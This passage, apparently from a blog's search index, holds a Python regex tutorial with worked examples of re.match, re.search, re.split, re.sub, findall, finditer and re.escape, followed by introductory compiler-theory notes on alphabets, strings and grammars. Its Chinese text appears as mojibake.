searchObj.group(1)) print (\"searchObj.group(2) : \", searchObj.group(2)) else: print( \"Nothing found!!\") ä»¥ä¸Šå®ä¾‹æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š searchObj.group() : Cats are smarter than dogs searchObj.group(1) : Cats searchObj.group(2) : smarter _____________________________________________________________________________ re.match å°è¯•ä»å­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®åŒ¹é…ä¸€ä¸ªæ¨¡å¼ï¼Œå¦‚æœä¸æ˜¯èµ·å§‹ä½ç½®åŒ¹é…æˆåŠŸçš„è¯ï¼Œmatch()å°±è¿”å›noneã€‚ å‡½æ•°è¯­æ³•ï¼š re.match(pattern, string, flags=0) å‡½æ•°å‚æ•°è¯´æ˜ï¼šï¼ˆåŒre.searchä¸€æ ·ï¼‰ åŒ¹é…æˆåŠŸre.matchæ–¹æ³•è¿”å›ä¸€ä¸ªåŒ¹é…çš„å¯¹è±¡ï¼Œå¦åˆ™è¿”å›Noneã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨group(num) æˆ– groups() åŒ¹é…å¯¹è±¡å‡½æ•°æ¥è·å–åŒ¹é…è¡¨è¾¾å¼ã€‚ åŒ¹é…å¯¹è±¡æ–¹æ³•ï¼šï¼ˆåŒre.searchä¸€æ ·ï¼‰ å®ä¾‹ import re print(re.match('www', 'www.runoob.com').span()) # åœ¨èµ·å§‹ä½ç½®åŒ¹é… print(re.match('com', 'www.runoob.com')) # ä¸åœ¨èµ·å§‹ä½ç½®åŒ¹é… ä»¥ä¸Šå®ä¾‹è¿è¡Œè¾“å‡ºç»“æœä¸ºï¼š (0, 3)Â None å®ä¾‹ import re line = \"Cats are smarter than dogs\" matchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I) if matchObj: print(\"matchObj.group() : \", matchObj.group()) print(\"matchObj.group(1) : \", matchObj.group(1)) print(\"matchObj.group(2) : \", matchObj.group(2)) else: print(\"No match!!\") ä»¥ä¸Šå®ä¾‹æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š matchObj.group() : Cats are smarter than dogs matchObj.group(1) : Cats matchObj.group(2) : smarter ____________________________________________________________________________ re.matchä¸re.searchçš„åŒºåˆ«: re.matchåªåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ï¼Œå¦‚æœå­—ç¬¦ä¸²å¼€å§‹ä¸ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œåˆ™åŒ¹é…å¤±è´¥ï¼Œå‡½æ•°è¿”å›Noneï¼›è€Œre.searchåŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåŒ¹é…ã€‚ å®ä¾‹ import re line = \"Cats are smarter than dogs\"; matchObj = re.match( r'dogs', line, re.M|re.I) if matchObj: print(\"match --\u003e matchObj.group() : \", matchObj.group()) else: print (\"No match!!\") matchObj = re.search( r'dogs', line, re.M|re.I) if matchObj: print(\"search --\u003e matchObj.group() : \", matchObj.group()) else: print(\"No match!!\") ä»¥ä¸Šå®ä¾‹è¿è¡Œç»“æœå¦‚ä¸‹ï¼š No match!! search --\u003e matchObj.group() : dogs     re.split()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  split æ–¹æ³•æŒ‰ç…§èƒ½å¤ŸåŒ¹é…çš„å­ä¸²å°†å­—ç¬¦ä¸²åˆ†å‰²åè¿”å›åˆ—è¡¨ï¼Œå®ƒçš„ä½¿ç”¨å½¢å¼å¦‚ä¸‹ï¼š re.split(pattern, string[, maxsplit=0, flags=0]) å‚æ•°: pattern:åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼ string:è¦åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚ maxsplit:åˆ†éš”æ¬¡æ•°ï¼Œmaxsplit=1 åˆ†éš”ä¸€æ¬¡ï¼Œé»˜è®¤ä¸º 0ï¼Œä¸é™åˆ¶æ¬¡æ•°ã€‚ flags:æ ‡å¿—ä½ï¼Œç”¨äºæ§åˆ¶æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ–¹å¼ï¼Œå¦‚ï¼šæ˜¯å¦åŒºåˆ†å¤§å°å†™ï¼Œå¤šè¡ŒåŒ¹é…ç­‰ç­‰ã€‚ å®ä¾‹ \u003e\u003e\u003eimport re \u003e\u003e\u003e re.split('\\W+', 'runoob, runoob, runoob.') ['runoob', 'runoob', 'runoob', ''] \u003e\u003e\u003e re.split('(\\W+)', ' runoob, runoob, runoob.') ['', ' ', 'runoob', ', ', 'runoob', ', ', 'runoob', '.', ''] \u003e\u003e\u003e re.split('\\W+', ' runoob, runoob, runoob.', 1) ['', 'runoob, runoob, runoob.'] \u003e\u003e\u003e re.split('a*', 'hello world') # å¯¹äºä¸€ä¸ªæ‰¾ä¸åˆ°åŒ¹é…çš„å­—ç¬¦ä¸²è€Œè¨€ï¼Œsplit ä¸ä¼šå¯¹å…¶ä½œå‡ºåˆ†å‰² ['hello world']     re.sub()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  Python çš„ re æ¨¡å—æä¾›äº†re.subç”¨äºæ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„åŒ¹é…é¡¹ã€‚ è¯­æ³•: re.sub(pattern, repl, string, count=0, flags=0) å‚æ•°ï¼š pattern : æ­£åˆ™ä¸­çš„æ¨¡å¼å­—ç¬¦ä¸²ã€‚ repl : æ›¿æ¢çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä¸ºä¸€ä¸ªå‡½æ•°ã€‚ string : è¦è¢«æŸ¥æ‰¾æ›¿æ¢çš„åŸå§‹å­—ç¬¦ä¸²ã€‚ count : æ¨¡å¼åŒ¹é…åæ›¿æ¢çš„æœ€å¤§æ¬¡æ•°ï¼Œé»˜è®¤ 0 è¡¨ç¤ºæ›¿æ¢æ‰€æœ‰çš„åŒ¹é…ã€‚ å®ä¾‹: import re phone = \"2004-959-559 # è¿™æ˜¯ä¸€ä¸ªå›½å¤–ç”µè¯å·ç \" num = re.sub(r'#.*$', \"\", phone)Â # åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„ Pythonæ³¨é‡Š print (\"ç”µè¯å·ç æ˜¯: \", num) num = re.sub(r'\\D', \"\", phone) # åˆ é™¤éæ•°å­—(-)çš„å­—ç¬¦ä¸² print (\"ç”µè¯å·ç æ˜¯ : \", num) ä»¥ä¸Šå®ä¾‹æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š ç”µè¯å·ç æ˜¯: 2004-959-559 ç”µè¯å·ç æ˜¯ : 2004959559 ä»¥ä¸‹å®ä¾‹ä¸­å°†å­—ç¬¦ä¸²ä¸­çš„åŒ¹é…çš„æ•°å­—ä¹˜ä»¥ 2ï¼š import re def double(matched):Â # å°†åŒ¹é…çš„æ•°å­—ä¹˜ä»¥ 2 value = int(matched.group('value')) return str(value * 2) s = 'A23G4HFD567' print(re.sub('(?P\u003cvalue\u003e\\d+)', double, s)) æ‰§è¡Œè¾“å‡ºç»“æœä¸ºï¼š A46G8HFD1134     findall()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  åœ¨å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°æ­£åˆ™è¡¨è¾¾å¼æ‰€åŒ¹é…çš„æ‰€æœ‰å­ä¸²ï¼Œå¹¶è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„ï¼Œåˆ™è¿”å›ç©ºåˆ—è¡¨ã€‚ æ³¨æ„ï¼š match å’Œ search æ˜¯åŒ¹é…ä¸€æ¬¡,findall åŒ¹é…æ‰€æœ‰ã€‚ è¯­æ³•æ ¼å¼ä¸ºï¼š findall(string[, pos[, endpos]]) å‚æ•°ï¼š string: å¾…åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚ pos: å¯é€‰å‚æ•°ï¼ŒæŒ‡å®šå­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®ï¼Œé»˜è®¤ä¸º 0ã€‚ endpos: å¯é€‰å‚æ•°ï¼ŒæŒ‡å®šå­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ï¼Œé»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ æŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰æ•°å­—ï¼š å®ä¾‹ import re pattern = re.compile(r'\\d+') # æŸ¥æ‰¾æ•°å­— result1 = pattern.findall('runoob 123 google 456') result2 = pattern.findall('run88oob123google456', 0, 10) #å–å­—ç¬¦ä¸²ä¹‹ä¸­0-10ä¹‹é—´çš„æ•°å­—å‡ºæ¥ print(result1ï¼Œresult2) è¾“å‡ºç»“æœï¼š ['123', '456']ï¼Œ['88', '12']     re.finditer()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  å’Œ findall ç±»ä¼¼ï¼Œåœ¨å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°æ­£åˆ™è¡¨è¾¾å¼æ‰€åŒ¹é…çš„æ‰€æœ‰å­ä¸²ï¼Œå¹¶æŠŠå®ƒä»¬ä½œä¸ºä¸€ä¸ªè¿­ä»£å™¨è¿”å›ã€‚ re.finditer(pattern, string, flags=0) å‚æ•°: pattern:åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼ string:è¦åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚ flags:æ ‡å¿—ä½ï¼Œç”¨äºæ§åˆ¶æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ–¹å¼ï¼Œå¦‚ï¼šæ˜¯å¦åŒºåˆ†å¤§å°å†™ï¼Œå¤šè¡ŒåŒ¹é…ç­‰ç­‰ã€‚ å®ä¾‹ import re it = re.finditer(r\"\\d+\",\"12a32bc43jf3\") for match in it: print (match.group() ) è¾“å‡ºç»“æœï¼š 12 32 43 3     re.escape()   re.escape()çš„ä¸»è¦ä½œç”¨å°±æ˜¯å°†ä¸€ä¸ªå­—ç¬¦ä¸²å˜æˆå¯ä»¥åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼\n1 2 3 4 5 6  re.escapeæ˜¯ä¸€ä¸ªå·¥å…·å‡½æ•°ï¼Œç”¨äºå¯¹å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å¯èƒ½è¢«è§†ä¸ºæ­£åˆ™è¡¨è¾¾å¼è¿ç®—ç¬¦çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ä½¿ç”¨è¿™ä¸ªå‡½æ•°çš„æƒ…å†µæœ‰ï¼šå­—ç¬¦ä¸²å¾ˆé•¿ï¼Œå…¶ä¸­åŒ…å«å¤§é‡ç‰¹æ®Šå­—ç¬¦ï¼Œè€Œä½ ä¸æƒ³è¾“å…¥å¤§é‡çš„åæ–œæ ï¼›ä½ ä»ç”¨æˆ·é‚£é‡Œè·å–äº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å‡½æ•°inputï¼‰ï¼Œæƒ³å°†å…¶ç”¨äºæ­£åˆ™è¡¨è¾¾å¼ä¸­ã€‚ä¸‹é¢çš„ç¤ºä¾‹è¯´æ˜äº†è¿™ä¸ªå‡½æ•°çš„å·¥ä½œåŸç†ï¼š \u003e\u003e\u003e re.escape('www.python.org')Â 'www\\\\.python\\\\.org'Â \u003e\u003e\u003e re.escape('But where is the ambiguity?')Â 'But\\\\where\\\\is\\\\the\\\\ambiuity\\\\?'Â   ","description":"","tags":["regex","python"],"title":"Regular Expression","uri":"/posts/regular-expression/"},{"categories":["compiler"],"content":"ä¸€ã€å¼•è®º ç¼–è¯‘åŸç†æ˜¯è‰¯å¥½çš„æ•°å­¦åŸºç¡€å’Œå¥½çš„å·¥ç¨‹ç»“æ„åŠŸèƒ½çš„ç»“åˆã€‚\nCompilerï¼šç¼–è¯‘ï¼Œè¿°è€Œä¸ä½œï¼Œå¿ äºç¼–å†™çš„ä¸œè¥¿\nç¼–è¯‘å™¨ä»é€»è¾‘ä¸Šå¯ä»¥åˆ†æˆè‹¥å¹²é˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µæŠŠæºç¨‹åºä»ä¸€ç§è¡¨ç¤ºå˜æ¢æˆå¦ä¸€ç§è¡¨ç¤º\n1.1ä»€ä¹ˆå«ç¼–è¯‘ç¨‹åº ç¿»è¯‘å™¨ï¼ˆç¿»è¯‘ç¨‹åºï¼‰ï¼šTranslater\nèƒ½å°†ä¸€ç§è¯­è¨€ç¨‹åºï¼ˆæºè¯­è¨€ç¨‹åºï¼‰è½¬æ¢æˆå¦ä¸€ç§ç­‰ä»·çš„è¯­è¨€ç¨‹åºï¼ˆç›®æ ‡è¯­è¨€ç¨‹åºï¼‰\nç¼–è¯‘å™¨ï¼ˆç¼–è¯‘ç¨‹åºï¼‰ï¼šCompiler\nèƒ½å°†ä¸€ç§è®¡ç®—æœºé«˜çº§è¯­è¨€ç¨‹åºï¼ˆæºè¯­è¨€ç¨‹åºï¼‰è½¬æ¢æˆå¦ä¸€ç§ç­‰ä»·çš„è®¡ç®—æœºä½çº§è¯­è¨€ç¨‹åºï¼ˆç›®æ ‡è¯­è¨€ç¨‹åºï¼‰\nè§£é‡Šå™¨ï¼ˆè§£é‡Šç¨‹åºï¼‰ï¼šInterpreter\nä¹Ÿæ˜¯ä¸€ç§ç¿»è¯‘ç¨‹åºï¼Œä»¥ä¸€ç§è¯­è¨€å†™çš„æºç¨‹åºä½œä¸ºè¾“å…¥ï¼Œä½†ä¸äº§ç”Ÿç›®æ ‡ä»£ç ï¼Œè€Œæ˜¯è¾¹è§£é‡Šè¾¹æ‰§è¡Œ\nè§£é‡Šå™¨å’Œç¼–è¯‘å™¨çš„åŒºåˆ«ï¼š\nâ‘ ç¼–è¯‘åˆ†æˆä¸¤æ­¥å®Œæˆï¼šå…ˆç¿»è¯‘ï¼Œåœ¨è¿è¡Œ\nâ‘¡è§£é‡Šåªç”¨ä¸€æ­¥å°±å®Œæˆï¼šè¾¹è§£é‡Šè¾¹æ‰§è¡Œ\nå¯å˜ç›®æ ‡ç¼–è¯‘ç¨‹åºï¼ˆRetargetable Compilerï¼‰\näº¤å‰ç¼–è¯‘ç¨‹åºï¼ˆCross Compilerï¼‰\n1.2ç¼–è¯‘ç¨‹åºçš„ç»„æˆ è¯æ³•åˆ†æå™¨ï¼šè¯»å…¥ç»„æˆæºç¨‹åºçš„å­—ç¬¦æµï¼Œå¹¶å°†å®ƒä»¬ç»„ç»‡æˆä¸ºæœ‰æ„ä¹‰çš„è¯ç´ çš„åºåˆ—\nè¯­æ³•åˆ†æå™¨ï¼šä½¿ç”¨ç”±è¯æ³•åˆ†æå™¨ç”Ÿæˆçš„å„ä¸ªè¯æ³•å•å…ƒçš„ç¬¬ä¸€ä¸ªåˆ†é‡æ¥åˆ›å»ºæ ‘å½¢çš„ä¸­é—´è¡¨ç¤ºï¼Œè¯¥ä¸­é—´è¡¨ç¤ºç»™å‡ºäº†è¯æ³•åˆ†æäº§ç”Ÿçš„è¯æ³•å•å…ƒæµçš„è¯­æ³•ç»“æ„ã€‚ä¸€ä¸ªå¸¸ç”¨çš„è¡¨ç¤ºæ–¹æ³•ä¾¿æ˜¯è¯­æ³•æ ‘ï¼Œæ ‘ä¸­çš„æ¯ä¸ªå†…éƒ¨èŠ‚ç‚¹è¡¨ç¤ºä¸€ä¸ªè¿ç®—\nè¯­ä¹‰åˆ†æå™¨ï¼šä½¿ç”¨è¯­æ³•æ ‘å’Œç¬¦å·è¡¨ä¸­çš„ä¿¡æ¯æ¥æ£€æŸ¥æºç¨‹åºæ˜¯å¦å’Œè¯­è¨€å®šä¹‰çš„è¯­ä¹‰ä¸€è‡´ã€‚åŒæ—¶ä¹Ÿæ”¶é›†ç±»å‹ä¿¡æ¯ï¼Œå¹¶æŠŠè¿™äº›ä¿¡æ¯å­˜æ”¾åœ¨è¯­æ³•æ ‘æˆ–ç¬¦å·è¡¨ä¸­ï¼Œä»¥ä¾¿åœ¨éšåçš„ä¸­é”®ä»£ç ç”Ÿæˆè¿‡ç¨‹ä¸­ä½¿ç”¨ã€‚\nä¸­é—´ä»£ç ç”Ÿæˆå™¨ï¼šåœ¨æŠŠä¸€ä¸ªæºç¨‹åºç¿»è¯‘æˆç›®æ ‡ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œä¸€ä¸ªç¼–è¯‘å™¨å¯èƒ½æ„é€ å‡ºä¸€ä¸ªæˆ–å¤šä¸ªä¸­é—´è¡¨ç¤ºã€‚è¿™äº›ä¸­é—´è¡¨ç¤ºå¯ä»¥æœ‰å¤šç§å½¢å¼ã€‚æ¯”å¦‚è¯­æ³•æ ‘æ˜¯ä¸€ç§ä¸­é—´è¡¨ç¤ºå½¢å¼ï¼Œé€šå¸¸åœ¨è¯­æ³•åˆ†æå’Œè¯­ä¹‰åˆ†æä¸­ä½¿ç”¨ã€‚\nä»£ç ä¼˜åŒ–å™¨ï¼šæœºå™¨æ— å…³çš„ä»£ç ä¼˜åŒ–æ­¥éª¤è¯•å›¾æ”¹è¿›ä¸­é—´ä»£ç ï¼Œä»¥ä¾¿ç”Ÿæˆæ›´å¥½çš„ç›®æ ‡ä»£ç \nä»£ç ç”Ÿæˆå™¨ï¼šä»£ç ç”Ÿæˆå™¨ä»¥æºç¨‹åºçš„ä¸­é—´è¡¨ç¤ºå½¢å¼ä½œä¸ºè¾“å…¥ï¼Œå¹¶æŠŠå®ƒæ˜ å°„åˆ°ç›®æ ‡è¯­è¨€ã€‚\nç¬¦å·è¡¨ç®¡ç†å™¨ï¼šè®°å½•æºç¨‹åºä¸­ä½¿ç”¨çš„å˜é‡çš„åå­—ï¼Œå¹¶æ”¶é›†å’Œæ¯ä¸ªåå­—çš„å„ç§å±æ€§æœ‰å…³çš„ä¿¡æ¯ã€‚\n Tips:\nå¦‚ä½•å­¦ä¹ æ„é€ ç¼–è¯‘ç¨‹åº\nï¼ˆ1ï¼‰æºè¯­è¨€ï¼Œå¯¹è¢«ç¼–è¯‘çš„æºç¨‹åºæ·±åˆ»ç†è§£å…¶ç»“æ„å’Œå«ä¹‰\nï¼ˆ2ï¼‰ç›®æ ‡è¯­è¨€ï¼Œå‡å®šç›®æ ‡è¯­è¨€æ˜¯æœºå™¨è¯­è¨€ï¼Œå°±å¿…é¡»ææ¸…æ¥šç¡¬ä»¶çš„ç³»ç»Ÿç»“æ„å’Œæ“ä½œç³»ç»Ÿçš„åŠŸèƒ½\nï¼ˆ3ï¼‰ç¼–è¯‘æ–¹æ³•ï¼ŒæŠŠä¸€ç§è¯­è¨€ç¿»è¯‘æˆå¦ä¸€ç§è¯­è¨€çš„æ–¹æ³•å¾ˆå¤šï¼Œé‡ç‚¹\n äºŒã€é«˜çº§è¯­è¨€åŠå…¶è¯­æ³•æè¿° 2.1ç¨‹åºè¯­è¨€çš„è¯­æ³•å’Œè¯­ä¹‰ 2.1.1è¯­æ³• ä»»ä½•è¯­è¨€å‡å¯ä½œä¸€ä¸ªé›†åˆã€‚è¿™ä¸ªé›†åˆä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯åœ¨ä¸€å®šç¬¦å·é›†ï¼ˆå­—æ¯è¡¨ï¼‰ä¸Šçš„ä¸€ä¸ªç¬¦å·ä¸²ã€‚\nå¯¹äºè‡ªç„¶è¯­è¨€æ¥è¯´ï¼Œä»–ä»¬æ˜¯å®šä¹‰åœ¨æŸä¸ªå­—æ¯è¡¨ä¸Šçš„å¥å­çš„é›†åˆ\nå¯¹äºç¨‹åºè¯­è¨€æ¥è¯´ï¼Œä»–ä»¬ä¹Ÿæ˜¯å®šä¹‰åœ¨æŸä¸ªå­—æ¯è¡¨ä¸Šçš„å¥å­çš„é›†åˆã€‚è¿™é‡Œçš„å¥å­ï¼Œå°±æ˜¯ä¸€ä¸ªæºç¨‹åºã€‚\nè¯æ³•è§„åˆ™ï¼šå•è¯ç¬¦å·æ˜¯è¯­è¨€ä¸­å…·æœ‰ç‹¬ç«‹æ„ä¹‰çš„æœ€åŸºæœ¬å•ä½ã€‚è¯­è¨€çš„å•è¯ç¬¦å·æ˜¯ç”±è¯æ³•è§„åˆ™æ‰€ç¡®å®šçš„ï¼Œå³è¯æ³•è§„åˆ™è§„å®šäº†å•è¯ç¬¦å·çš„å½¢æˆè§„åˆ™ã€‚\nè¯­æ³•è§„åˆ™ï¼šä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•æˆ–BNFï¼ˆBackus-NaurèŒƒå¼ï¼‰\n2.1.2è¯­ä¹‰ è¯­ä¹‰ï¼Œå®šä¹‰ç¨‹åºçš„æ„ä¹‰\næ²¡æœ‰å…¬è®¤çš„å½¢å¼ç³»ç»Ÿæè¿°è¯­ä¹‰\n2.2ç¨‹åºè¯­è¨€çš„ä¸€èˆ¬ç‰¹å¾ é«˜çº§è¯­è¨€çš„åˆ†ç±»  å¼ºåˆ¶æ€§è¯­è¨€ï¼ˆImperative Languageï¼‰|è¿‡ç¨‹å¼è¯­è¨€ï¼šFortranï¼ŒCï¼ŒPascal åº”ç”¨å¼è¯­è¨€ï¼ˆApplicative Languageï¼‰|å‡½æ•°å¼è¯­è¨€ï¼šLISP åŸºäºè§„åˆ™çš„è¯­è¨€ï¼ˆRuled-based Languageï¼‰ï¼šProlog é¢å‘å¯¹è±¡è¯­è¨€ï¼ˆObject-oriented Languageï¼‰ï¼šJAVAï¼Œc++  2.3ç¨‹åºè¯­è¨€çš„è¯­æ³•æè¿° ä¸€ã€å­—æ¯è¡¨å’Œç¬¦å·ä¸² å­—æ¯è¡¨ï¼šç¬¦å·çš„éç©ºæœ‰é™é›†åˆ ä¾‹ï¼šâˆ‘ ={aï¼Œbï¼Œc}\nç¬¦å·ï¼šå­—æ¯è¡¨ä¸­çš„å…ƒç´  ä¾‹ï¼š aï¼Œbï¼Œc\nç¬¦å·ä¸²ï¼šç¬¦å·çš„æœ‰ç©·åºåˆ— ä¾‹ï¼ša, aa, ac, abcï¼Œ..\nç©ºç¬¦å·ä¸²ï¼šæ— ä»»ä½•ç¬¦å·çš„ç¬¦å·ä¸²( Îµ )\nç¬¦å·ä¸²é›†åˆï¼šç”±ç¬¦å·ä¸²æ„æˆçš„é›†åˆã€‚\n ç¬¦å·ä¸²çš„å½¢å¼å®šä¹‰\næœ‰å­—æ¯è¡¨âˆ‘ï¼Œå®šä¹‰ï¼š\nï¼ˆ1ï¼‰Îµæ˜¯âˆ‘ä¸Šçš„ç¬¦å·ä¸²ï¼›\nï¼ˆ2ï¼‰è‹¥xæ˜¯âˆ‘ä¸Šçš„ç¬¦å·ä¸²ï¼Œä¸”aâˆˆ âˆ‘ï¼Œåˆ™axæˆ–xaæ˜¯ âˆ‘ ä¸Šçš„ç¬¦å·ä¸²ï¼›\nï¼ˆ3ï¼‰yæ˜¯âˆ‘ä¸Šçš„ç¬¦å·ä¸²ï¼Œiffï¼ˆå½“ä¸”ä»…å½“ï¼‰yå¯ç”±ï¼ˆ1ï¼‰å’Œï¼ˆ2ï¼‰äº§ç”Ÿã€‚\n äºŒã€ç¬¦å·ä¸²å’Œç¬¦å·ä¸²é›†åˆçš„è¿ç®— ç¬¦å·ä¸²ç›¸ç­‰ï¼šè‹¥xã€yæ˜¯é›†åˆä¸Šçš„ä¸¤ä¸ªç¬¦å·ä¸²ï¼Œåˆ™xï¼yï¼Œiffï¼ˆå½“ä¸”ä»…å½“ï¼‰ç»„æˆxçš„æ¯ä¸€ä¸ªç¬¦å·å’Œç»„æˆyçš„æ¯ä¸€ä¸ªç¬¦å·ä¾æ¬¡ç›¸ç­‰ã€‚\nç¬¦å·ä¸²çš„é•¿åº¦ï¼šè‹¥xä¸ºç¬¦å·ä¸²ï¼Œå…¶é•¿åº¦|x|ç­‰äºç»„æˆè¯¥ç¬¦ å·ä¸²çš„ç¬¦å·ä¸ªæ•°ã€‚ï¼ˆä¾‹ï¼šxï¼STVï¼Œ |x|=3ï¼‰\nç¬¦å·ä¸²çš„è¿æ¥ï¼šè‹¥xã€yæ˜¯å®šä¹‰åœ¨Î£æ˜¯ä¸Šçš„ç¬¦å·ä¸²ï¼Œä¸”xï¼XYï¼Œyï¼YXï¼Œåˆ™xå’Œyçš„è¿æ¥ xy ï¼ XYYX ä¹Ÿæ˜¯Î£ä¸Šçš„ç¬¦å·ä¸²ã€‚ï¼ˆæ³¨æ„ï¼šä¸€èˆ¬xy â‰  yxï¼Œä½†æ˜¯Îµx = xÎµï¼‰\nç¬¦å·ä¸²é›†åˆçš„ä¹˜ç§¯è¿ç®—ï¼šä»¤Aã€Bä¸ºç¬¦å·ä¸²é›†åˆï¼Œå®šä¹‰ABï¼{ xy | xâˆˆA, yâˆˆB}\nç¬¦å·ä¸²é›†åˆçš„å¹‚è¿ç®—ï¼šæœ‰ç¬¦å·ä¸²é›†åˆAï¼Œå®šä¹‰A0 ={Îµ}, A1=A, A2=AA, A3=AAA,â€¦â€¦ â€¦â€¦, Anï¼An-1A=AAn-1  ï¼Œn\u003e0\nç¬¦å·ä¸²é›†åˆçš„é—­åŒ…è¿ç®—ï¼šè®¾Aæ˜¯ç¬¦å·ä¸²é›†åˆï¼Œå®šä¹‰ Aï¼‹ï¼ A1 âˆª A2 âˆª A3 âˆªâ€¦â€¦âˆª An âˆªâ€¦â€¦ ç§°ä¸ºé›†åˆAçš„æ­£åˆ™é—­åŒ…ã€‚A*ï¼ A0 âˆªAï¼‹ ç§°ä¸ºé›†åˆAçš„é—­åŒ…ã€‚ï¼ˆA0 = { Îµ } ï¼‰\nä¸ºä»€ä¹ˆå¯¹ç¬¦å·ã€ç¬¦å·ä¸²ã€ç¬¦å·ä¸²é›†åˆä»¥åŠå®ƒä»¬çš„è¿ç®—æ„Ÿå…´è¶£ï¼Ÿ\nè‹¥Aä¸ºæŸè¯­è¨€çš„åŸºæœ¬å­—ç¬¦é›†\nâ€‹ Aï¼{a,b,â€¦â€¦z,0,1,â€¦â€¦,9, +,ï¼,Ã—,_/, ( , ), =â€¦â€¦}\nBä¸ºå•è¯é›†\nâ€‹ B ={begin, end, if, then,else,for,â€¦â€¦,\u003cæ ‡è¯†ç¬¦\u003e,\u003cå¸¸é‡\u003e,â€¦â€¦}\nåˆ™B âŠ‚ A* ã€‚\nè¯­è¨€çš„å¥å­æ˜¯å®šä¹‰åœ¨Bä¸Šçš„ç¬¦å·ä¸²ã€‚\nè‹¥ä»¤Cä¸ºå¥å­é›†åˆï¼Œåˆ™C âŠ‚ B* , ç¨‹åº âŠ‚ C\nä¸‰ã€æ–‡æ³•çš„ç›´è§‚ç†è§£ 1.ä»€ä¹ˆæ˜¯æ–‡æ³•ï¼šæ–‡æ³•æ˜¯å¯¹è¯­è¨€ç»“æ„çš„å®šä¹‰ä¸æè¿°ã€‚å³ä»å½¢å¼ä¸Šç”¨äºæè¿°å’Œè§„å®šè¯­è¨€ç»“æ„çš„ç§°ä¸ºâ€œæ–‡æ³•â€ï¼ˆæˆ–ç§°ä¸ºâ€œè¯­æ³•â€ï¼‰ã€‚\n2.è¯­æ³•è§„åˆ™ï¼šæˆ‘ä»¬é€šè¿‡å»ºç«‹ä¸€ç»„è§„åˆ™ï¼ˆäº§ç”Ÿå¼ï¼‰ï¼Œæ¥æè¿°å¥å­çš„è¯­æ³•ç»“æ„ã€‚è§„å®šç”¨â€œ::=â€è¡¨ç¤ºâ€œç”±â€¦â€¦ç»„æˆâ€œã€‚\n ä¾‹å¦‚ï¼š\n\u003cå¥å­\u003e::=\u003cä¸»è¯­\u003e\u003cè°“è¯­\u003e\n\u003cä¸»è¯­\u003e::=\u003cä»£è¯\u003e|\u003cåè¯\u003e\n\u003cä»£è¯\u003e ::=ä½ |æˆ‘|ä»–\n\u003cåè¯\u003e::= ç‹æ°‘|å¤§å­¦ç”Ÿ|å·¥äºº|è‹±è¯­\n\u003cè°“è¯­\u003e::=\u003cåŠ¨è¯\u003e\u003cç›´æ¥å®¾è¯­\u003e\n\u003cåŠ¨è¯\u003e::=æ˜¯|å­¦ä¹ \n\u003cç›´æ¥å®¾è¯­\u003e::=\u003cä»£è¯\u003e|\u003cåè¯\u003e\n 3.ç”±äº§ç”Ÿå¼æ¨å¯¼å¥å­ï¼š3.æœ‰äº†ä¸€ç»„äº§ç”Ÿå¼ä¹‹åï¼Œå¯ä»¥æŒ‰ç…§ä¸€å®šçš„æ–¹å¼ç”¨å®ƒä»¬å»æ¨å¯¼æˆ–äº§ç”Ÿå¥å­ã€‚\nâ€‹ æ¨å¯¼æ–¹æ³•ï¼šä»ä¸€ä¸ªè¦è¯†åˆ«çš„ç¬¦å·å¼€å§‹æ¨å¯¼ï¼Œå³ç”¨ç›¸åº”äº§ç”Ÿå¼çš„å³éƒ¨æ¥æ›¿ä»£äº§ç”Ÿå¼çš„å·¦éƒ¨ï¼Œæ¯æ¬¡ä»…ç”¨ä¸€æ¡äº§ç”Ÿå¼å»è¿›è¡Œæ¨å¯¼ã€‚\n\u003cå¥å­\u003e =\u003e \u003cä¸»è¯­\u003e\u003cè°“è¯­\u003e\n\u003cä¸»è¯­\u003e\u003cè°“è¯­\u003e =\u003e \u003cä»£è¯\u003e\u003cè°“è¯­\u003e\nâ€¦â€¦ â€¦â€¦\nè¿™ç§æ¨å¯¼ä¸€ç›´è¿›è¡Œä¸‹å»ï¼Œç›´åˆ°æ‰€æœ‰å¸¦\u003c 